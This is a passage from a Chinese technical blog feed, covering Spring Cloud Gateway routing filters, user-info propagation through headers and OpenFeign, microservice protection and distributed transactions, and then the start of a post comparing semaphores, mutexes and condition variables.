\d+</td></tr><tr><td>Host</td><td>请求必须是访问某个host（域名）</td><td>Host=**.somehost.org,**.anotherhost.org</td></tr><tr><td>Method</td><td>请求方式必须是指定方式</td><td>Method=GET,POST</td></tr><tr><td>Path</td><td>请求路径必须符合指定规则</td><td>Path=/red/{segment},/blue/**</td></tr><tr><td>Query</td><td>请求参数必须包含指定参数</td><td>Query=name, Jack 或者 Query=name</td></tr><tr><td>RemoteAddr</td><td>请求者的ip必须是指定范围</td><td>RemoteAddr=192.168.1.1/24</td></tr><tr><td>Weight</td><td>权重处理</td><td>Weight=group1, 2</td></tr><tr><td>X-Forwarded Remote Addr</td><td>基于请求的来源IP做判断</td><td>XForwardedRemoteAddr=192.168.1.1/24</td></tr></tbody></table></div><p><code>filters</code> 可取以下值：</p><div class="table-container"><table><thead><tr><th>Name</th><th>Description</th><th>Example</th></tr></thead><tbody><tr><td>AddRequestHeader</td><td>给当前请求添加一个请求头</td><td>AddrequestHeader=headerName,headerValue</td></tr><tr><td>RemoveRequestHeader</td><td>移除请求中的一个请求头</td><td>RemoveRequestHeader=headerName</td></tr><tr><td>AddResponseHeader</td><td>给响应结果中添加一个响应头</td><td>AddResponseHeader=headerName,headerValue</td></tr><tr><td>RemoveResponseHeader</td><td>从响应结果中移除有一个响应头</td><td>RemoveResponseHeader=headerName</td></tr><tr><td>RewritePath</td><td>请求路径重写（ant path 语法）</td><td>RewritePath=/red/?(?\&lt;segment\</td><td>.*), /\\{segment}</td></tr><tr><td>StripPrefix</td><td>去除请求路径中的N段前缀</td><td>StripPrefix=1，则路径/a/b转发时只保留/b</td></tr><tr><td>……</td><td>……</td><td>……</td></tr></tbody></table></div><blockquote><p>一共有 33 种，详见官网。</p></blockquote><p>值得注意的是，filter 是基于 router 生效的、作用于 router 的。Spring Cloud 中的 filter 分为两种：</p><ul><li>GlobalFilter：全局过滤器，作用于所有路由，在声明该过滤器后无需激活即可生效；</li><li>GatewayFilter：路由过滤器，共 33 种，作用于指定路由，默认不生效。上面的在<strong><u>配置文件</u></strong>中写的 <code>filters</code> 就是这个过滤器！</li></ul><h4 id="Spring-Cloud-Gateway-过滤机制-以及-Spring-Security-对比"><a href="#Spring-Cloud-Gateway-过滤机制-以及-Spring-Security-对比" class="headerlink" title="Spring Cloud Gateway 过滤机制 以及 Spring Security 对比"></a>Spring Cloud Gateway 过滤机制 以及 Spring Security 对比</h4><p>这里只介绍了网关 forward 的配置，那么如果想对网关做更进一步的配置（例如身份验证），应该怎么操作？</p><p>首先需要了解 Spring Cloud Gateway 的底层机制。</p><p><img src='imgs/gateway-filters.png'></p><p>这里的思路几乎和 Spring Security 的过滤器链一模一样（责任链模式）。</p><p>因此我们想加入身份验证功能，就需要在 Filter 的 <code>PRE</code> 部分定义检查逻辑。如果符合条件，则允许通过 <code>NettyRoutingFilter</code> 进行转发；否则抛出异常立即拒绝请求。</p><p>现在做身份验证的思路就非常清楚了：自定义一个 Filter 类，最好像 Spring Security 的 <code>OncePerRequestFilter</code> 一样每次请求仅通过一次，插入到 <code>NettyRoutingFilter</code> 之前，就能完成任务。</p><p><strong><u>但是有几点和之前的微服务架构截然不同</u></strong>！！！</p><p>考虑第一点：网关如何向微服务传递当前登录用户的信息？</p><p>注意到现在网关、各个微服务都是独立的服务了，和单体架构不同，我们<strong>不能</strong>通过保存在类似于 <code>SecurityContext</code> 这样的单线程上下文（<code>ThreadLocal</code>）中，把网关中检查的用户信息传给 forward 的目标服务了。</p><p>回忆一下，网关向微服务 forward 实际上已经是一次新的 HTTP 请求了，而且我们之前在 Gateway 的 filters 参数中看到，gateway 可以配置额外添加请求头信息。因此不难想到，我们可以通过在网关的自定义 filter 中加入关于用户信息的请求头就能解决这个问题！</p><p>但再考虑第二个问题：既然网关和微服务间通过传递请求头来完成用户信息传递，那微服务之间相互调用也很频繁，它们默认还是原来的请求方式（<code>Nacos + OpenFeign</code>），没有请求头，难道要更改原来的代码，每个微服务请求 Client Proxy 时还要主动记录和传递用户信息？</p><p>是的！不过幸好 <code>OpenFeign</code> 有另一套方法帮我们加上这个请求头，所以不必担心。</p><p>下面我们来认识一下如何自定义 filter，并且完成身份认证的功能。</p><h4 id="自定义-Global-Filter"><a href="#自定义-Global-Filter" class="headerlink" title="自定义 Global Filter"></a>自定义 Global Filter</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">GlobalFilter</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义 PRE 部分的 Gateway Global Filter </span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> exchange 经过该 filter 时，过滤器链的请求上下文，包括 request、response、前面的 filter 写入的信息；</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> chain 过滤器链中下一条要执行的 filter</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 类似 JavaScript 中的回调函数。采用了 WebFlux 的非阻塞的、响应式接口，因为 PRE 和 POST 间时间可能很长，所以实际上 POST 部分 filter 是通过定义这个回调的行为来完成的。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span>;</span><br><span class="line">    <span class="comment">/* 合理的做法是，和 Spring Security 类似，返回 chain.filter(exchange)，将 filter 链委托给下一级 */</span></span><br><span class="line">    <span class="comment">/* 如果想要阻止请求（例如未认证），那么请拿到 response，set response code，并且返回一个 response.setComplete() 标识请求已经回复（拒绝） */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还需要注意的是：</p><ul><li>global filter 需要继承于 <code>Ordered</code> 接口；</li><li>并且重写 <code>int getOrder()</code> 方法，这样能为 filter 安排插入顺序。注意：返回的整型越小优先级越高，并且 <code>NettyRoutingFilter</code> 的 order 是最大整型，因此任意一个不是 <code>INT_MAX</code> 的 order 都会让 filter 排在它的前面；</li><li>最后需要使用 <code>@Component</code> 纳入 Spring IoC Container 管理；</li><li>最后还要选一个配置类，使用 <code>@Bean</code> 提供一个 <code>GlobalFilter</code> 实例！！</li></ul><h4 id="自定义-Gateway-Filter"><a href="#自定义-Gateway-Filter" class="headerlink" title="自定义 Gateway Filter"></a>自定义 Gateway Filter</h4><p>这就是我们自定义写在 <code>filters</code> 配置文件中的 filter。本部分为进阶功能，一般使用不到。</p><p>我们需要继承于 <code>AbstractGatewayFilterFactory&lt;Object&gt;</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrintAnyGatewayFilterFactory</span> <span class="keyword">implements</span> <span class="title class_">AbtractGatewayFilterFactory</span>&lt;Config&gt; &#123;</span><br><span class="line">    <span class="comment">/* config 类型请使用你想要的，例如 List 或者自定义类型 */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> GatewayFilter <span class="title function_">apply</span><span class="params">(Config config)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">GatewayFilter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Mono&lt;<span class="keyword">void</span>&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">                <span class="comment">/* same as Global Filter */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 定义传给 config 的数据类型 */</span></span><br><span class="line">    <span class="meta">@Data</span>    <span class="comment">// lombok</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Config</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String a;</span><br><span class="line">        <span class="keyword">private</span> String b;</span><br><span class="line">        <span class="keyword">private</span> String c;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 定义配置参数缩写名（类似设定命令行参数缩写） */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">shortcutFieldOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> List.of(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 使用构造函数告诉 AbstractGatewayFilterFactory config 的配置类型 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PrintAnyGatewayFilterFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(Config.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的 <code>Config</code> 类型可以换成任何的自定义类型，以完成参数配置需求。如果不需要任何参数，直接使用 <code>Object</code> 类型，后面 3 个函数也就没有必要了。</p><p>这样前缀 <code>PrintAny</code>（去除 <code>GatewayFilterFactory</code>）就是配置名，我们就能自定义 filters 参数了：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">cloud:</span></span><br><span class="line">        <span class="attr">gateway:</span></span><br><span class="line">            <span class="attr">routes:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">...</span></span><br><span class="line">                  <span class="attr">uri:</span> <span class="string">...</span></span><br><span class="line">               <span class="attr">predicates:</span> <span class="string">...</span></span><br><span class="line">               <span class="attr">filters: PrintAny:</span> <span class="string">&lt;config&gt;</span><span class="comment"># 需要和自己定义的 config 类型匹配</span></span><br></pre></td></tr></table></figure><p>此外，对于 <code>GatewayFilter</code> 如果想指定顺序，请使用 <code>OrderedGatewayFilter</code> 包装：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> GatewayFilter <span class="title function_">apply</span><span class="params">(Object config)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OrderedGatewayFilter</span>(<span class="keyword">new</span> <span class="title class_">GatewayFilter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Mono&lt;<span class="keyword">void</span>&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">            <span class="comment">/* same as Global Filter */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="comment">/* order */</span> <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下，<code>GatewayFilter</code> 的定义使用了抽象工厂模式，满足了多样化定制需求。</p><h4 id="Spring-Cloud-Gateway-传递用户信息"><a href="#Spring-Cloud-Gateway-传递用户信息" class="headerlink" title="Spring Cloud Gateway 传递用户信息"></a>Spring Cloud Gateway 传递用户信息</h4><p>现在我们来解决之前提到的两个问题：</p><ul><li>网关如何向微服务传递当前登录用户的信息？</li><li>微服务之间相互调用如何使用 <code>OpenFeign</code> 传递用户信息？</li></ul><p>对第一个问题，我们采用如下思路：</p><p><img src="imgs/g2m.png"></p><p>这样我们微服务中的业务在本微服务内就沿用之前的 context 方案，无需更改，只需要修改进入微服务的拦截器即可；</p><p>先看如何更改 <code>GlobalFilter</code> 的请求内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ServerWebExchange.mutate() 方法可以返回已初始化的对象的 builder 以供修改 */</span></span><br><span class="line">exchange.mutate()</span><br><span class="line">    <span class="comment">/* 传递修改 request 的 build 方法 */</span></span><br><span class="line">    .request(builder -&gt; builder.head(<span class="string">&quot;info&quot;</span>, info))</span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure><p>对于新建拦截器，我们不必在每个微服务中都写一遍，只需在共同依赖的模块中写入即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInfoInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 识别信息并保存到 context，不作拦截 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 请求结束后，请销毁 context */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记得把 Interceptor 配置到 Spring 中，在每次请求前进行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MvcConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(<span class="comment">/* 拦截器实例 */</span>);</span><br><span class="line">            <span class="comment">/* .addPathPattern() 可以选择作用的 path pattern，不写就是作用全部 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是还需要注意，这里的 Bean 现在没法被其他用到的模块扫描到，我们需要在这个模块的 <code>resources/META_INF/spring.factories</code> 中，配置：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">org.springframework.boot.autoconfigure.EnableAutoConfiguration</span>=<span class="string">\</span></span><br><span class="line"><span class="string">    &lt;package name&gt;.MvcConfig</span></span><br></pre></td></tr></table></figure><p>这样使得在该项目中， Spring 默认会将这个类加入 IoC Container。</p><blockquote><p>注意：在 Spring 3.x 以后，已经全面取消 <code>spring.factories</code> 中的 <code>org.springframework.boot.autoconfigure.EnableAutoConfiguration</code> 键的作用了。</p><p>在 Spring 3.x 的项目中，上面的配置是无效的，Spring 是不会扫描并且自动装配你指定的类的。</p><p>你需要在 <code>META-INT/spring/</code> 目录下新建一个文件 ``</p></blockquote><p>但是需要注意，这里采用的 <code>WebMvcConfigurer</code> 只能在微服务中生效，不能在 Gateway 中生效（因为 Gateway 是 <code>WebFlux</code> 非阻塞式接口，不能引入 Spring MVC 的接口），所以我们需要条件装配：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在 MvcConfig 前面的加入注解 */</span></span><br><span class="line"><span class="meta">@ConditionalOnClass(DispatcherServlet.class)</span>    <span class="comment">/* 该类是 Spring MVC 的核心 API */</span></span><br></pre></td></tr></table></figure><p>对于第二个问题，我们只需要对 <code>OpenFeign</code> 的请求进行定义：让每次 <code>OpenFeign</code> 触发微服务间调用时，都带上一个自定义的请求头，就像网关传给微服务一样。这里使用 <code>OpenFeign</code> 给的接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RequestInterceptor</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">apply</span><span class="params">(RequestTemplate template)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这同样要定义在所有微服务中都依赖的模块中（因为是配置，所以用 bean 注入）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在某个配置 Feign 的类中 */</span></span><br><span class="line"><span class="keyword">public</span> RequestInterceptor <span class="title function_">userInfoInterceptor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RequestInterceptor</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">apply</span><span class="params">(RequestTemplate template)</span> &#123;</span><br><span class="line">            <span class="comment">/* 配置请求头 */</span></span><br><span class="line">            template.header(&lt;header name str&gt;, &lt;context&gt; <span class="comment">/* 位于同线程，可用 */</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，这个配置类需要显式配置给 <code>OpenFeign</code>（就像之前配置 Feign 日志的全局配置一样）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableFeignClients(value = ..., defaultConfiguration = 该类名)</span></span><br></pre></td></tr></table></figure><h1 id="Chapter-2-微服务理论"><a href="#Chapter-2-微服务理论" class="headerlink" title="Chapter 2. 微服务理论"></a>Chapter 2. 微服务理论</h1><h2 id="2-1-微服务雪崩"><a href="#2-1-微服务雪崩" class="headerlink" title="2.1 微服务雪崩"></a>2.1 微服务雪崩</h2><p>在微服务相互调用中，服务提供者出现故障或阻塞。并且：</p><ul><li>服务调用者没有做好异常处理，导致自身故障；</li><li>或者访问连接一直保持 / 请求速度大于处理速率，致使请求不断堆积在 tomcat 中导致资源耗尽；</li></ul><p>最终，调用链中的所有服务级联失败，导致整个集群故障。</p><p><img src='imgs/avalanche.png' width="500px"></p><p>解决微服务雪崩的思路主要如下：</p><ol><li>尝试避免出现故障 / 阻塞；<ul><li>保证代码的健壮性；</li><li>保证网络畅通；</li><li>能应对较高的并发请求；</li><li><strong>微服务保护</strong>：保护服务提供方；</li></ul></li><li>局部出现故障 / 阻塞后，及时做好预备方案（积极有效的错误处理）；<ul><li><strong>微服务保护</strong>：保护服务调用方；</li></ul></li></ol><h2 id="2-2-微服务保护"><a href="#2-2-微服务保护" class="headerlink" title="2.2 微服务保护"></a>2.2 微服务保护</h2><p>为了应对微服务雪崩，我们有许多解决方案。其中，微服务保护是在业务逻辑代码层面以外的一种重要方案。</p><p>微服务保护有以下一些思路：</p><ul><li><p>请求限流：保护服务提供方。限制访问微服务的请求的并发量，避免服务因流量激增出现故障（<strong>应对访问模式：spike 型</strong>）；</p></li><li><p>线程隔离（舱壁模式）：保护服务消费方。通过限定每个业务能使用的线程数量而将故障业务隔离，避免故障扩散；</p><p><img src="imgs/thread-isolation.png" width="400px"></p></li><li><p>快速失败 和 服务熔断：</p><ul><li>快速失败：给业务编写一个调用失败时的处理的逻辑，称为 <code>fallback</code>。当调用出现故障（比如无线程可用）时，按照失败处理逻辑执行业务并返回，而不是直接抛出异常；</li><li>由<strong>断路器</strong>统计请求的异常比例或慢调用比例，如果超出阈值，则认为<strong>某个微服务业务所对应的所有实例都不可用</strong>，熔断该业务，则拦截该接口的请求。熔断期间，所有请求均 <code>fallback</code> 为快速失败逻辑；</li></ul><p><img src="imgs/fuse.png" width="400px"></p></li></ul><p>以上微服务保护的策略可以使用 <code>Sentinel</code> / <code>Hystrix</code> 框架完成。</p><div class="table-container"><table><thead><tr><th>Metrics or Feature</th><th><code>Sentinel</code></th><th><code>Hystrix</code></th></tr></thead><tbody><tr><td>Belong to</td><td>Spring Cloud Alibaba</td><td>Spring Cloud Netflix</td></tr><tr><td>Thread Isolation</td><td>信号量隔离</td><td>线程池隔离/信号量隔离</td></tr><tr><td>Fuse Policy</td><td>基于慢调用比例或异常比例</td><td>基于异常比率</td></tr><tr><td>Traffic Limiting</td><td>基于 QPS，支持流量整形</td><td>支持</td></tr><tr><td>Fallback</td><td>支持</td><td>支持</td></tr><tr><td>Configuration Method</td><td>基于控制台，重启后失效</td><td>基于注解或配置文件，永久生效</td></tr></tbody></table></div><p>想了解微服务保护框架具体如何使用，请参见官网样例或官方文档。</p><h2 id="2-3-微服务分布式事务"><a href="#2-3-微服务分布式事务" class="headerlink" title="2.3 微服务分布式事务"></a>2.3 微服务分布式事务</h2><blockquote><p>在分布式系统中，如果一个业务需要多个服务合作完成，而且每一个服务都有事务，多个事务必须同时成功或失败，这样的事务就是<strong><u>分布式事务</u></strong>。其中的每个服务的事务就是一个<strong>分支事务</strong>。整个业务称为<strong>全局事务</strong>。</p></blockquote><p>除了微服务雪崩的问题外，微服务设计中还存在一个重难点：如何保证微服务数据 ACID 的性质（如何正确进行分布式事务）。</p><p>以一个商品订单服务为例：</p><p><img src="imgs/inconsistency.png" width="600px"></p><p>如果最终库存服务失败，那么虽然订单服务可能可以识别到错误并且回滚，但是购物车服务与库存服务间没有关系，极有可能不会回滚，造成数据的不一致性。这就是没有保证分布式事务一致性。</p><p>那么我们应该如何保证微服务流程的一致性？</p><p>这个时候需要引入一个分布式事务的协调组件，让各个子事务（分支事务）感知到彼此的事务状态，根据总体的事务状态进行判断，协调全局事务的提交或回滚，这样就能保证事务状态和数据的一致性。</p><p>这个分布式事务的协调组件被称为：<strong>事务协调者（Transaction Coordinator，TC）</strong>；</p><p>除了事务协调者，还需要有一个组件，用于定义单个全局事务的范围（从哪个子事务开始，到哪个子事务结束）。这个组件就被称为：<strong>事务管理器（Transaction Manager，TM）</strong>；</p><p>有了 TC 和 TM，就能准确地定义一个全局事务； </p><p>为了进一步从业务逻辑中解耦，我们额外增添一个组件用于说明某个子事务的事务状态。它的作用是，向 TC 注册子事务，并且报告子事务的事务状态。这就被称为：<strong>资源管理器（Resource Manager，RM</strong>）；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-0-基本概念&quot;&gt;&lt;a href=&quot;#Chapter-0-基本概念&quot; class=&quot;headerlink&quot; title=&quot;Chapter 0. 基本概念&quot;&gt;&lt;/a&gt;Chapter 0. 基本概念&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;微服务是一种软件架构风格。专</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Web" scheme="https://blog.sjtuxhw.top/tags/Web/"/>
    
    <category term="Microservice" scheme="https://blog.sjtuxhw.top/tags/Microservice/"/>
    
  </entry>
  
  <entry>
    <title>Semaphore, Mutex, CV</title>
    <link href="https://blog.sjtuxhw.top/technical/semaphore-mutex-and-cv/"/>
    <id>https://blog.sjtuxhw.top/technical/semaphore-mutex-and-cv/</id>
    <published>2024-05-11T15:20:35.000Z</published>
    <updated>2024-10-25T14:01:12.013Z</updated>
    
    <content type="html"><![CDATA[<p>学习 ICS 的并行一章之后，笔者有些疑惑，semaphore（信号量）、mutex（互斥锁）、conditional variables（条件变量）这 3 者之间究竟该怎么区分它们的使用场景？</p><p>首先我们需要去阐述清楚它们各自的定义和效果。</p><p>学术界认为 mutex 是 semaphore 的特例，因此像著名的书籍 CSAPP 就先以 semaphore 为例讲了讲并发程序的资源控制问题。但是实际上有相当一部分实践派和语义派认为二者不应该混为一谈。像 Linus 本人在一次将 Linux 内核的一部分 semaphore 重构为 mutex 后，发现不仅改善了代码语义，还在一定程度上提升了性能。这件事也说明了，虽然在理论上一方可以替代另一方，但实践上它们各有所长。</p><h2 id="Semaphore-vs-Mutex"><a href="#Semaphore-vs-Mutex" class="headerlink" title="Semaphore vs Mutex"></a>Semaphore vs Mutex</h2><p>我们先讨论 semaphore。</p><p>CSAPP 中先从 “线程间变量共享” 的情况说起，它指出，程序对内存的更改并不直接在内存上完成，在汇编中可以看到，大致经历了 load（从内存到 CPU 寄存器）、update（在 CPU 寄存器内更新数据）、store（将 CPU 寄存器数据写回内存）这 3 步。</p><p>而根据程序的局部性原理、context switch 的随机性，出现脏读、不可重复读的情况几乎是必然的。这样的话两个线程甚至无法完成简单的累加计算。</p><p>为了解决这个问题，CSAPP 引入了 semaphore，这种做法就等价于建立了一个资源临界区，而 semaphore 的初始值则限制了 <u>能同时访问在 semaphore 保护下的代码 并发执行的线程数量</u>。</p><p>semaphore 中有一个特殊情况，也就是初值为 1 的情况，只允许一个线程并发执行受保护的代码。这种特殊的信号量就被称为 Binary Semaphore。</p><p>现在看 Mutex（互斥锁），我们发现，互斥锁的作用实际上要说明<u>任何线程对 mutex 包含的资源的访问都是互斥的（同一时间仅能有一个线程访问）</u>。</p><p>但是有人说，这不就是 binary semaphore 的定义吗！</p><p>实际上，Binary Semaphore 和  <strong>互斥锁</strong>（<code>mutex</code>）有些微妙的区别。</p><p>Mutex 相比 binary semaphore 增加了<strong>所有权的概念</strong>，<u>一只锁住的 Mutex 只能由给它上锁的线程解开</u>，只有系铃人才能解铃。Mutex 的功能也就因而限制在了构造 unsafe region 的 “围墙” 上。</p><p>Binary semaphore 则可以由任一线程解开。比如某进程读取磁盘并进入睡眠，等待中断读取盘块结束之后来唤醒它，而这种情况 Mutex 是解决不了的。</p><p>这是因为 semaphore 的语义有两个功能：<strong>保护资源 + 通知</strong>。除了限制资源并发数量，semaphore 的释放还能通知等待 semaphore 的线程。</p><p>Mutex 相较 semaphore 的优势在于，Mutex 职责更单一，语义更清晰，实现的效率稍微高一点。</p><h2 id="Semaphore-vs-Conditional-Variable"><a href="#Semaphore-vs-Conditional-Variable" class="headerlink" title="Semaphore vs Conditional Variable"></a>Semaphore vs Conditional Variable</h2><p>你可能会想，semaphore 有通知的语义，那条件变量不也有吗？它们俩又有什么区别呢？</p><p>实际上，你可以把条件变量理解成一个抽象层级更高的机制。</p><p>条件变量实际上是一种<strong>等待队列</strong>，<strong>提供了 “唤醒”（wake）和 “阻塞等待”（blocking-wait）两类操作</strong>，也就是入队时等待、出队时唤醒。不过这个出队条件由条件决定，唤醒和阻塞的机制交由 OS 的系统调用完成。</p><p>它们俩的共同点是，semaphore 和 CV 底层都可以用 Mutex（互斥锁在这里就是低层级同步原语，low-level synchronizing primitive）实现，它们共同的使用场景是<strong>对共享资源访问的同步机制（通知）</strong>。</p><p>然后我们再以使用场景来说明它们的不同点。</p><p>条件变量常常被用于避免资源的 Busy Waiting，像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while (!queue.empty()) &#123;</span><br><span class="line">    sleep(1);</span><br><span class="line">&#125;</span><br><span class="line">/* do something */</span><br></pre></td></tr></table></figure><p>这种行为会浪费大量的处理器资源。那么为什么不能有个变量让线程等待在上面，直到 available 后自动提醒这个线程继续运行？</p><p>条件变量的作用就在这里。它可以<u>同步多个线程对于某个条件的判断，当该条件触发时（通常是另一个线程对这个条件变量执行了操作），会随机/全部唤醒正在等待条件的线程</u>。可以说条件变量是有条件的提醒机制。</p><blockquote><p>举个例子，比如并行计算中的 checkpoints 